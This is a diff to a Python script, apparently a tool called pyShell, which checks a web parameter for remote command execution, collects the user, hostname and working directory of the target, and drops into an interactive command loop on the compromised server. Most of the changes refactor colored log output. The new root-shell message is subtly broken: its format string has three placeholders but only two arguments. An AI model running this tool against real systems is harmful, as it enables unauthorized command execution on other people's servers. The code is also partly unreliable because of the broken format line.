@@ -5,7 +5,19 @@ import requests
 import re
 import argparse
 import random
-from config import user_agent
+from config import user_agent, colors
+
+def log(mode, msg):
+	if mode == 'e':
+		sys.stdout.write("%s[%sx%s] " % (colors['rst'], colors['red'], colors['rst']))
+	elif mode == 'w':
+		sys.stdout.write("%s[%s!%s] " % (colors['rst'], colors['ble'], colors['rst']))
+	elif mode == 'a':
+		sys.stdout.write("%s[%s+%s] " % (colors['rst'], colors['cyn'], colors['rst']))
+	elif mode == 'i':
+		sys.stdout.write("%s[%s*%s] " % (colors['rst'], colors['grn'], colors['rst']))
+	sys.stdout.write("%s\n" % msg)
+	sys.stdout.flush()
 
 class pyShell():
 	mask=""
@@ -16,20 +28,21 @@ class pyShell():
 		self.prepend = args.prepend
 		self.append = args.append
 
-		print("\033[33m[+] \033[0mUrl: \033[33m%s" % self.url["full"])
-		print("\033[33m[+] \033[0mParameter: \033[33m%s" % self.param)
-		print("\033[33m[+] \033[0mMethod used: \033[33m%s" % self.method)
-		print("\033[33m[+] \033[0mPrepended data: \033[33m%s" % self.prepend)
-		print("\033[33m[+] \033[0mAppended data: \033[33m%s" % self.append)
+		log("i", "Url: %s%s" % (colors["grn"], self.url["full"]))
+		log("i", "Parameter: %s%s" % (colors["grn"], self.param))
+		log("i", "Method: %s%s" % (colors["grn"], self.method))
+		log("i", "Prepended: %s%s" % (colors["grn"], self.prepend))
+		log("i", "Appended: %s%s" % (colors["grn"], self.append))
 
-		print("\033[33m[*] \033[0mChecking RCE...")
+		log("i", "Checking RCE...")
 
 		if self.check_rce():
-			print("\033[32m[!] \033[0mRCE confirmed!")
+			log("w", "RCE confirmed!")
+			log("i", "Filtering out static content...")
 			self.mask=self.get_diff()
 			self.run()
 		else:
-			print("\033[31m[!] No RCE found. exiting...\033[0m")
+			log("e", "No RCE found.")
 			sys.exit()
 
 
@@ -84,7 +97,6 @@ class pyShell():
 		return False
 
 	def get_diff(self):
-		print("\033[33m[*] \033[0mFiltering out static content...")
 		r=self.doReq("echo bbzbztrt")[0]
 		b=str(r)
 		(bmask, amask) = re.split("bbzbztrt", b)
@@ -103,18 +115,18 @@ class pyShell():
 		return (output, sc)
 
 	def run(self):
-		print("\033[32m[!] \033[0mGetting shell info...")
+		log("a", "Getting shell info...")
 		(user,hostname,cwd)=self.doCmd("whoami;hostname;pwd")[0].split("\n")
-		print("\033[33m[*] \033[0mUser \t: \033[33m%s\033[0m" % user)
-		print("\033[33m[*] \033[0mHostname \t: \033[33m%s\033[0m" % hostname)
-		print("\033[33m[*] \033[0mCWD \t: \033[33m%s\033[0m" % cwd)
+		log ("i", "User \t: %s%s" % (colors['grn'], user))
+		log ("i", "Host \t: %s%s" % (colors['grn'], hostname))
+		log ("i", "CWD \t: %s%s" % (colors['grn'], cwd))
 
 		if user == 'root':
-			print("\033[32m[!!!] w00t w00t! Please enjoy your r00t shell!\033[0m")
+			log("a", "%s w00t w00t!%s Please enjoy your r00t shell>%s" % (colors['grn'], colors['rst']))
 			terminator="#"
 		else:
+			log("a", "Here is your shell sir>")
 			terminator="$"
-		print("\033[32m[>] \033[0mHere is your shell sir.")
 		while True:
 			prompt=input("%s@%s: %s %s " % (user, hostname, cwd, terminator))
 			(ret,sc)=self.doCmd(prompt)
